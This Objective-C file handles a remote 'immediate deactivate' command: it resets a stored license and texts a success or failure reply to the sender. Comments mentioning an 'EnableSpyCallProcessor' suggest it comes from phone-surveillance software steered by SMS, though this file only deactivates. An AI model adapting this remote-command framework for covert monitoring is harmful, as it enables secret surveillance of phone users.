//
//  ImmediateDeactivateProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 5/10/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "ImmediateDeactivateProcessor.h"
#import "LicenseInfo.h"

@interface ImmediateDeactivateProcessor (private)

- (void) deactivateWithoutConnectiingToServer;
- (void) sendReplySMS: (BOOL) aSuccess;

@end

@implementation ImmediateDeactivateProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the EnableSpyCallProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (EnableSpyCallProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ImmediateDeactivateProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ImmediateDeactivateProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"ImmediateDeactivateProcessor--->doProcessingCommand");
	[self deactivateWithoutConnectiingToServer];
}

- (void) deactivateWithoutConnectiingToServer {
	DLog (@"deactivateWithoutConnectiingToServer")
	LicenseInfo *licenseInfo = [[LicenseInfo alloc] init];
	[licenseInfo setLicenseStatus:DEACTIVATED];
	[licenseInfo setConfigID:-1];
	[licenseInfo setMd5:[DEFAULTMD5 dataUsingEncoding:NSUTF8StringEncoding]];
	[licenseInfo setActivationCode:_DEFAULTACTIVATIONCODE_];
	BOOL isCommitLicenseSuccess = [[[RemoteCmdUtils sharedRemoteCmdUtils] mLicenseManager] commitLicense:licenseInfo];
	[licenseInfo release];
	
	if (isCommitLicenseSuccess) {
		DLog(@"DEACTIVATED isCommitLicenseSuccess = YES");
	} else {
		DLog(@"DEACTIVATED isCommitLicenseSuccess = NO");
	}
	[self sendReplySMS:isCommitLicenseSuccess];

}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) sendReplySMS: (BOOL) aSuccess {
	NSUInteger success;
	if (aSuccess) {
		success = _SUCCESS_;
	} else {
		success = 1;
	}

	DLog (@"ImmediateDeactivateProcessor--->sendReplySMS")
																						
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		DLog (@"SMS reply is required")
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:success];
		NSString *deactivationMessage = messageFormat;
		if (aSuccess) {
			deactivationMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kDeactivate", @"")];
		}
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:deactivationMessage];
	} else {
		DLog (@"SMS reply is NOT required")
	}

}


-(void) dealloc {
	[super dealloc];
}

@end

